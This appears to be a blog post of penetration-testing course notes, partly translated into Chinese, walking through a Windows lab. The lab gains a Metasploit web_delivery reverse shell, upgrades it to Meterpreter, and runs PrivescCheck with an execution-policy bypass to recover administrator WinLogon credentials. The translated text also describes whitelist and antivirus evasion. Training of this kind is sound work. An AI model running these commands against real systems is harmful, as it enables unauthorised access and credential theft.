---
layout: post
title: "Identifying Windows Privilege Escalation Vulnerabilities"
date: "2023-06-27"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Privilege Escalation
## Identifying Windows Privilege Escalation Vulnerabilities
## Identifying PrivEsc Vulnerabilities
In order to elevate your privileges on Windows, you must first, identify privilege escalation vulnerabilities that exist on the target system.

This process will differ greatly based on the type of target you gain access to. Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system's unique configuration.

This process can be quite tedious and time consuming and as a result, it is recommended to automate the processes of identifying privilege escalation vulnerabilities. This can be done through the use of various automation scripts.

## PrivescCheck
PrivescCheck - This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be useful for exploitation and/or post-exploitation.

GitHub Repo: [itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

Monica:
# Windows提权
## 发现Windows提权漏洞
## 发现提权漏洞
为了在Windows上提升您的特权，您必须首先确定目标系统上存在的提权漏洞。

这个过程将根据您访问的目标类型而有很大的不同。基于Windows的版本和系统的独特配置，Windows上的提权可以通过大量的技术来执行。

这个过程可能会非常繁琐和耗时，因此建议自动化识别特权升级漏洞的过程。这可以通过使用各种自动化脚本来完成。

## PrivescCheck
PrivescCheck - 这个脚本旨在枚举常见的Windows配置问题，可以利用这些问题进行本地特权升级。它还收集了各种可能有用于利用和/或后期利用的信息。

GitHub Repo: [itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

chatGPT:
# Windows提权
## 识别Windows提权漏洞
## 识别提权漏洞
为了在Windows上提升权限，首先需要识别目标系统上存在的提权漏洞。

这个过程将根据您获得访问权限的目标类型而有很大不同。根据Windows的版本和系统的独特配置，可以通过多种技术来执行Windows的提权。

这个过程可能相当繁琐和耗时，因此建议自动化识别提权漏洞的过程。可以通过使用各种自动化脚本来实现。

## PrivescCheck
PrivescCheck - 这个脚本旨在枚举可用于本地权限提升的常见Windows配置问题。它还收集了一些可能对利用和/或后期利用有用的各种信息。

GitHub存储库：[itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

## Demo: Identifying Windows Privilege Escalation Vulnerabilities（演示：识别Windows提权漏洞）
We are going to be exploring the process of identifying Windows Privilege Escalation vulnerabilities as well as exploring a couple of examples as to how we can elevate our privileges on a Windows system after we have gained access to it. If you gain access to a Windows system and you're provided with elevated privileges or `NT AUTHORITY\SYSTEM` privileges, then you can skip over the privilege escalation phase of post exploitation. However, you may need to go through that phase again once you exploit another system on the target network. But we are going to be running under the assumption that you've gained access to a Windows system without elevated privileges. And we are starting off with the process of how to identify Windows Privilege Escalation vulnerabilities.

The first step in the practical section will involve gaining access to the Windows target system, after which we can then take a look at how to utilize the PrivescCheck script to identify a privilege escalation vulnerability, and then we'll exploit that vulnerability in order to elevate our privileges.

Target Machine IP Address : 10.2.31.230

The target system doesn't have any vulnerable services running on it. So the way we're going to gain access to the system is by utilizing a Metasploit Framework module called web_delivery.

[Script Web Delivery](https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery/)

Script Web Delivery

脚本 Web 交付

该模块快速启动一个Web服务器，用于提供有效载荷。该模块将根据所选择的目标提供要在目标机器上运行的命令。提供的命令将使用指定的脚本语言解释器或通过regsvr32.exe使用"squiblydoo"下载和执行有效载荷，以绕过应用程序白名单。该模块的主要目的是在攻击者必须手动输入命令时快速在目标机器上建立会话，例如命令注入、RDP会话、本地访问或远程命令执行。此攻击向量不会写入磁盘，因此不太可能触发AV解决方案，并且将允许由Meterpreter提供的特权升级。在使用任何PSH目标时，请确保有效载荷架构与目标计算机匹配，或者在x64机器上使用SYSWOW64 powershell.exe来执行x86有效载荷。Regsvr32使用"squiblydoo"技术绕过应用程序白名单。签名的Microsoft二进制文件Regsvr32能够请求.sct文件，然后在其中执行包含的PowerShell命令。类似地，pubprn目标使用pubprn.vbs脚本请求和执行.sct文件。两个Web请求（即.sct文件和PowerShell下载/执行）可以在同一个端口上进行。SyncAppvPublishingServer目标使用SyncAppvPublishingServer.exe Microsoft签名二进制文件请求和执行PowerShell脚本。该技术仅适用于Windows 10版本<= 1709。"PSH（二进制）"将向磁盘写入文件，允许提供自定义二进制文件以供下载和执行。

Script Web Delivery 是一个 Meterpreter 模块，它允许攻击者通过 Web 服务器将有效载荷交付到受害者计算机。该模块提供了多种交付方式，包括使用指定的脚本语言解释器或通过 regsvr32.exe 使用 "squiblydoo" 绕过应用程序白名单。使用此模块时，有效载荷不会写入磁盘，因此不太可能触发 AV 解决方案。此外，该模块还提供了一种快速建立会话的方法，以便攻击者可以在目标机器上执行命令。

```
msfconsole
search web_delivery
use exploit/multi/script/web_delivery # use 1
show options
```

This particular exploit modules sets up a web server that hosts a payload based on the target operating system. Once you hit exploit, it then generates some PowerShell code, because in this case, we're targeting Windows. And this particular module supports Python, PHP, Windows, Linux, we'll then copy that PowerShell code and execute it on the target system, which will consequently download the payload that is being hosted on the web server and execute it, that will consequently provide us with a standard command shell session, which we can then upgrade to a meterpreter session.

We're going to set the target to PowerShell.

```
set target PSH\ (Binary)
```

We are then going to set the payload. We're going to obtain a simple command shell session.

```
set payload windows/shell/reverse_tcp
```

We also want to disable the PowerShell code from being encoded in base64.

```
set PSH-EncodedCommand false
```

We still need to configure the payload options.

```
set LHOST eth1
```

```
exploit
```

It will generate some PowerShell code. Copy all of this PowerShell code. And head over to the victim system. We'll open up the search menu here and open up a command prompt session. Paste in the command that you copied.

```
cmd
```

If you take a look at the Kali system, we have obtained access to the target system. 

```
sessions
sessions 1
```

And we currently have access to the target system through a simple command shell session. And we currently have access as the user student.

```
whoami
hostname
```

Before we move forward, I want to migrate this command shell session to a meterpreter session.

`Ctrl+z`: put this in the background or type in `background`.

```
search shell_to
use post/multi/manage/shell_to_meterpreter # use 0
show options
set LHOST eth1
set SESSION 1
```

If we show advanced, we need to set an additional option that is under WIN_TRANSFER. Instead of setting the transfer method to PowerShell, we want to set that to visual basic.

```
show advanced
set WIN_TRANSFER VBS
exploit
```

You'll receive a meterpreter session.

```
sessions
sessions 2
```

```
meterpreter > sysinfo
```

The operating system architecture is 64 bit. And our meterpreter session is 32 bit. We can migrate to a 64 bit process.

```
meterpreter > ps
```

We can migrate to explore.exe. It's only displaying the privileges associated with the user that we currently have access to for specific processes. And the rest of the processes, that means are currently running with privileges of other users or `NT AUTHORITY\SYSTEM` or service privileges. And that means we cannot migrate to them. 

```
3624 3292 explorer.exe x64 2 ATTACKDEFENSE\student C:\Windows\explorer.exe
```

It's going to migrate into the explorer.exe process for stability.

```
meterpreter > migrate 3624
meterpreter > getuid
```

We can now confirm that this user is unprivileged.

```
meterpreter > getprivs
```

We now need to elevate our privileges.

```
meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd student
meterpreter > cd Desktop
meterpreter > cd PrivescCheck
meterpreter > dir
meterpreter > shell
```

[PrivescCheck](https://github.com/itm4n/PrivescCheck)

这个脚本旨在列举可用于本地提权的常见 Windows 配置问题。它还收集了各种可能有用于利用和/或后渗透的信息。

```cmd
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

`Ctrl+Shift+Alt`

WinLogon: it found one result and it has provided us with the administrator credentials. We'll be taking a loot at how we can utilize these credentials to elevate our privileges. And how we can authenticate to the target system with them.

That is how to identify Windows privilege escalation vulnerabilities through the use of an automated script.

Now that we've been able to identify a privilege escalation vulnerability, and in this case, we were able to identify the WinLogon credentials for the administrator user. We'll be exploring the process of how to utilize these credentials to obtain an elevated session. Because if you obtain Windows crdentials, and RDP is disabled, how can you use these credentials to obtain an elevated session.